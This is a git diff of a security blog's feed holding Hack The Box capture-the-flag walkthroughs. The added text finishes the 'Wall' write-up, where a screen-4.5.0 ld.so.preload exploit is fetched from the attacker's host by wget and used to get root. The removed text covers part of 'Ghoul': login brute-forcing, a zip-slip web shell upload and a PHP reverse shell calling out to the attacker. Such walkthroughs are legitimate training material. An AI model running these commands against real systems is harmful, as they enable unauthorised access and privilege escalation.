+--2019-12-07 00:23:12--  http://10.10.xx.xx/libhax.so
+Connecting to 10.10.xx.xx:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16144 (16K) [application/octet-stream]
+Saving to: 'libhax.so'
+
+libhax.so           100%[===================&amp;gt;]  15.77K  11.7KB/s    in 1.3s    
+
+2019-12-07 00:23:14 (11.7 KB/s) - 'libhax.so' saved [16144/16144]
+
+www-data@Wall:/tmp$ wget http://10.10.xx.xx/rootshell
+--2019-12-07 00:23:20--  http://10.10.xx.xx/rootshell
+Connecting to 10.10.xx.xx:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16832 (16K) [application/octet-stream]
+Saving to: 'rootshell'
+
+rootshell           100%[===================&amp;gt;]  16.44K  16.3KB/s    in 1.0s    
+
+2019-12-07 00:23:22 (16.3 KB/s) - 'rootshell' saved [16832/16832]
+
+www-data@Wall:/tmp$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Wall:/tmp$ cd /etc
+www-data@Wall:/etc$ umask 000
+www-data@Wall:/etc$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;
+www-data@Wall:/etc$ /bin/screen-4.5.0 -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+www-data@Wall:/etc$ /tmp/rootshell
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
+# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/wall/10.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;And we owned root !
+&lt;br /&gt;That’s it , Feedback is appreciated !
+&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
+&lt;br /&gt;Thanks for reading.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/heist/&quot;&gt;Hack The Box - Heist&lt;/a&gt;&lt;/p&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="python" /><category term="waf" /><category term="suid" /><summary type="html">Quick Summary Hey guys, today Wall retired and here’s my write-up about it. It was an easy Linux machine with a web application vulnerable to RCE, WAF bypass to be able to exploit that vulnerability and a vulnerable suid binary. It’s a Linux machine and its ip is 10.10.10.157, I added it to /etc/hosts as wall.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/wall# nmap -sV -sT -sC -o nmapinitial wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 13:59 EST Nmap scan report for wall.htb (10.10.10.157) Host is up (0.50s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA) | 256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA) |_ 256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/wall/0.png" /></entry><entry><title type="html">Hack The Box - Heist</title><link href="https://0xrick.github.io/hack-the-box/heist/" rel="alternate" type="text/html" title="Hack The Box - Heist" /><published>2019-11-30T00:00:00+02:00</published><updated>2019-11-30T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/heist</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/heist/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
 &lt;p&gt;&lt;br /&gt;Hey guys, today Heist retired and here’s my write-up about it. It’s an easy Windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.149&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;heist.htb&lt;/code&gt;. Let’s jump right in !&lt;br /&gt;
@@ -266,7 +618,8 @@ security.ask_for_password
 &lt;br /&gt;Thanks for reading.
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chainsaw/&quot;&gt;Hack The Box - Chainsaw&lt;/a&gt;&lt;/p&gt;
+&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chainsaw/&quot;&gt;Hack The Box - Chainsaw&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/wall/&quot;&gt;Hack The Box - Wall&lt;/a&gt;&lt;/p&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="smb" /><category term="winrm" /><summary type="html">Quick Summary Hey guys, today Heist retired and here’s my write-up about it. It’s an easy Windows machine and its ip is 10.10.10.149, I added it to /etc/hosts as heist.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/heist# nmap -sV -sT -sC -o nmapinitial heist.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-29 12:01 EST Nmap scan report for heist.htb (10.10.10.149) Host is up (0.16s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/heist/0.png" /></entry><entry><title type="html">Hack The Box - Chainsaw</title><link href="https://0xrick.github.io/hack-the-box/chainsaw/" rel="alternate" type="text/html" title="Hack The Box - Chainsaw" /><published>2019-11-23T00:00:00+02:00</published><updated>2019-11-23T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/chainsaw</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/chainsaw/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
@@ -5390,1062 +5743,4 @@ root
 &lt;br /&gt;
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ghoul/&quot;&gt;Hack The Box - Ghoul&lt;/a&gt;
 &lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ellingson/&quot;&gt;Hack The Box - Ellingson&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="sqli" /><category term="ssh" /><summary type="html">Quick Summary Hey guys, today writeup retired and here’s my write-up about it. It was a very nice box and I enjoyed it. It’s a Linux box and its ip is 10.10.10.138, I added it to /etc/hosts as writeup.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/writeup# nmap -sV -sT -sC -o nmapinitial writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-11 16:03 EET Nmap scan report for writeup.htb (10.10.10.138) Host is up (0.14s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/writeup/0.png" /></entry><entry><title type="html">Hack The Box - Ghoul</title><link href="https://0xrick.github.io/hack-the-box/ghoul/" rel="alternate" type="text/html" title="Hack The Box - Ghoul" /><published>2019-10-05T00:00:00+02:00</published><updated>2019-10-05T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/ghoul</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/ghoul/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.101&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ghoul.htb&lt;/code&gt;. Let’s jump right in !
-&lt;img src=&quot;/images/hackthebox/ghoul/0.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# nmap -sV -sT -sC -o nmapinitial ghoul.htb 
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 12:47 EET
-Nmap scan report for ghoul.htb (10.10.10.101)
-Host is up (0.22s latency).
-Not shown: 996 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
-|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
-80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Aogiri Tree
-2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
-|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
-|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
-8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
-| http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
-|_  Basic realm=Aogiri
-|_http-server-header: Apache-Coyote/1.1
-|_http-title: Apache Tomcat/7.0.88 - Error report
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;We got two &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; ports 22,2222 and two &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports 80,8080. Let’s check the first &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;initial-web-enumeration&quot;&gt;Initial Web Enumeration&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://ghoul.htb&lt;/code&gt; we see a basic static website with nothing really interesting :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/1.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with the extensions &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# gobuster -u http://ghoul.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,html
-
-=====================================================
-Gobuster v2.0.1              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://ghoul.htb/
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Extensions   : php,html
-[+] Timeout      : 10s
-=====================================================
-2019/10/04 12:53:49 Starting gobuster
-=====================================================
-/.hta (Status: 403)
-/.hta.php (Status: 403)
-/.hta.html (Status: 403)
-/.htaccess (Status: 403)
-/.htaccess.php (Status: 403)
-/.htaccess.html (Status: 403)
-/.htpasswd (Status: 403)
-/.htpasswd.php (Status: 403)
-/.htpasswd.html (Status: 403)
-/archives (Status: 301)
-/blog.html (Status: 200)
-/contact.html (Status: 200)
-/css (Status: 301)
-/images (Status: 301)
-/index.html (Status: 200)
-/index.html (Status: 200)
-/js (Status: 301)
-/secret.php (Status: 200)
-/server-status (Status: 403)
-/uploads (Status: 301)
-/users (Status: 301)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/secret.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/users&lt;/code&gt; look interesting.
-&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/secret.php&lt;/code&gt; :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Of course this user flag was just a troll, but there are two interesting things here, first one is &lt;code class=&quot;highlighter-rouge&quot;&gt;Noro&lt;/code&gt; asking &lt;code class=&quot;highlighter-rouge&quot;&gt;Kaneki&lt;/code&gt; for access and &lt;code class=&quot;highlighter-rouge&quot;&gt;Kaneki&lt;/code&gt; replying with &lt;code class=&quot;highlighter-rouge&quot;&gt;ILoveTouka&lt;/code&gt; which looks like a password. The other thing is the fake art site &lt;code class=&quot;highlighter-rouge&quot;&gt;Kaneki&lt;/code&gt; talked about which is probably the site running on port 8080.
-&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/users&lt;/code&gt; :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ILoveTouka&lt;/code&gt; didn’t work as a password so I tried to bruteforce the password with the username &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; and I got it (&lt;code class=&quot;highlighter-rouge&quot;&gt;abcdef&lt;/code&gt;) :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# wfuzz --hh 1073 -c -u http://ghoul.htb/users/login.php -X POST -d &quot;Username=admin&amp;amp;Password=FUZZ&amp;amp;Submit=Login&quot; -w ./darkweb2017-top10000.txt 
-
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-
-********************************************************
-* Wfuzz 2.3.4 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://ghoul.htb/users/login.php
-Total requests: 10000
-
-==================================================================
-ID   Response   Lines      Word         Chars          Payload    
-==================================================================
-
-000242:  C=302      0 L        0 W            0 Ch        &quot;abcdef&quot;
-000311:  C=200     37 L       81 W         1073 Ch        &quot;12345qwert&quot;^C
-Finishing pending requests...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;However this was just another troll :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/4.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;I couldn’t find anything else on port 80 so I checked port 8080. It had basic &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; authentication :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;But it was easily guessable, &lt;code class=&quot;highlighter-rouge&quot;&gt;admin : admin&lt;/code&gt; :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/7.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;This is the fake art website &lt;code class=&quot;highlighter-rouge&quot;&gt;Kaneki&lt;/code&gt; was talking about, and we can upload images. But we can also upload &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archives :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;arbitrary-file-write-zip-slip--rce&quot;&gt;Arbitrary File Write (Zip Slip) –&amp;gt; RCE&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;The ability to upload zip archives can cause a vulnerability known as &lt;a href=&quot;https://snyk.io/research/zip-slip-vulnerability&quot;&gt;zip slip&lt;/a&gt;. This happens when the archive has files with directory traversal paths in their names. During extraction, if the target is vulnerable it will write the extracted files to the specified paths in their names.
-&lt;br /&gt;We need to put a shell in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;, so I copied &lt;code class=&quot;highlighter-rouge&quot;&gt;simple-backdoor.php&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; then I added it to a zip archive using a lot of &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; before the file path :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# cd /var/www/html/
-root@kali:/var/www/html# cp /usr/share/webshells/php/simple-backdoor.php ./shell.php
-root@kali:/var/www/html# zip shell.zip ../../../../../../../../../../var/www/html/shell.php 
-  adding: ../../../../../../../../../../var/www/html/shell.php (deflated 35%)
-root@kali:/var/www/html# cd -
-/root/Desktop/HTB/boxes/ghoul
-root@kali:~/Desktop/HTB/boxes/ghoul# mv /var/www/html/shell.zip .
-root@kali:~/Desktop/HTB/boxes/ghoul# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;This is the easiest way to do it, let’s look at the file with &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;, you’ll see the file name : &lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/10.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;When this &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; is extracted on the machine it will put &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;. 
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/11.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;The shell was successfully uploaded :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Now we can simply get a reverse shell, the usual &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; shell didn’t work because &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; wasn’t installed on the box so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; instead :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php -r '$sock=fsockopen(&quot;10.10.xx.xx&quot;,1337);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ghoul/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/15.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;privilege-escalation-on-aogiri-user-flag&quot;&gt;Privilege Escalation on Aogiri, User Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;First thing I did after getting a shell was to get a stable shell :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ which python
-/usr/bin/python
-$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
-www-data@Aogiri:/var/www/html$ ^Z
-[1]+  Stopped                 nc -lvnp 1337
-root@kali:~/Desktop/HTB/boxes/ghoul# stty raw -echo
-root@kali:~/Desktop/HTB/boxes/ghoul# nc -lvnp 1337
-
-www-data@Aogiri:/var/www/html$ export TERM=screen
-www-data@Aogiri:/var/www/html$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; couldnt access any of the directories :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Aogiri:/var/www/html$ cd /home/
-www-data@Aogiri:/home$ ls -la
-total 36
-drwxr-xr-x 1 root   root   4096 Dec 13  2018 .
-drwxr-xr-x 1 root   root   4096 Dec 13  2018 ..
-drwx------ 1 Eto    Eto    4096 Dec 13  2018 Eto
-drwx------ 1 kaneki kaneki 4096 Dec 13  2018 kaneki
-drwx------ 1 noro   noro   4096 Dec 13  2018 noro
-www-data@Aogiri:/home$ cd Eto/
-bash: cd: Eto/: Permission denied
-www-data@Aogiri:/home$ cd kaneki/
-bash: cd: kaneki/: Permission denied
-www-data@Aogiri:/home$ cd noro/
-bash: cd: noro/: Permission denied
-www-data@Aogiri:/home$ cd -
-/var/www/html
-www-data@Aogiri:/var/www/html$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;So I had to escalate. By looking at the shell I uploaded I saw that it was created by root :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Aogiri:/var/www/html$ ls -la
-total 352
-drwxr-xr-x 1 root root   4096 Oct  4 11:17 .
-drwxr-xr-x 1 root root   4096 Jan 22  2019 ..
-drwxr-xr-x 1 root root   4096 Dec 13  2018 archives
--r-xr-xr-x 1 root root  10723 Dec 13  2018 blog.html
--r-xr-xr-x 1 root root   8977 Dec 13  2018 contact.html
-dr-xr-xr-x 1 root root   4096 Dec 13  2018 css
--r-xr-xr-x 1 root root  37906 Dec 13  2018 eto.jpg
-dr-xr-xr-x 1 root root   4096 Dec 13  2018 images
--r-xr-xr-x 1 root root  11000 Dec 13  2018 index.html
-dr-xr-xr-x 1 root root   4096 Dec 13  2018 js
--r-xr-xr-x 1 root root  13721 Dec 13  2018 kaneki-ken.jpg
--rw-r--r-- 1 root root    239 Dec 13  2018 kaneki.html
--r-xr-xr-x 1 root root 112642 Dec 13  2018 kaneki.jpg
--r-xr-xr-x 1 root root    134 Dec 13  2018 kaneki.php
--r-xr-xr-x 1 root root  13721 Dec 13  2018 ken.jpg
-dr-xr-xr-x 1 root root   4096 Dec 13  2018 less
--r-xr-xr-x 1 root root  18457 Dec 13  2018 noro.jpg
--r-xr-xr-x 1 root root   4865 Dec 13  2018 secret.php
--rw-r--r-- 1 root root    328 Oct  4 11:17 shell.php
--r-xr-xr-x 1 root root  18159 Dec 13  2018 tatara.jpg
-dr-xr-xr-x 1 root root   4096 Dec 13  2018 uploads
-dr-xr-xr-x 1 root root   4096 Dec 13  2018 users
-www-data@Aogiri:/var/www/html$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;So I tried to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; exploit again to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, but first I had to create the &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file. I copied the one from the box :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Aogiri:/var/www/html$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
-kaneki:x:1000:1000::/home/kaneki:/bin/bash
-Eto:x:1001:1001::/home/Eto:/bin/bash
-noro:x:1002:1002::/home/noro:/bin/bash
-www-data@Aogiri:/var/www/html$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
